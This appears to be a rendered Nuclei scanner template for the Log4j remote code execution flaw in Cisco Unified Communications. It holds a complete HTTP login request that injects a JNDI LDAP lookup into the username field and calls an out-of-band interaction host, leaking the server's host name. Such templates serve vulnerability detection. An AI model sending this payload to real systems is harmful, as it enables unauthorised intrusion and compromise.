# Nuclei Template: Cisco Unified Communications - Remote Code Execution (Apache Log4j)
**Template ID:** cisco-unified-communications-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`cisco-unified-communications-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Cisco Unified Communications is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
POST /ccmadmin/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/ccmadmin/showHome.do

appNav=ccmadmin&j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin
```

## References
- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
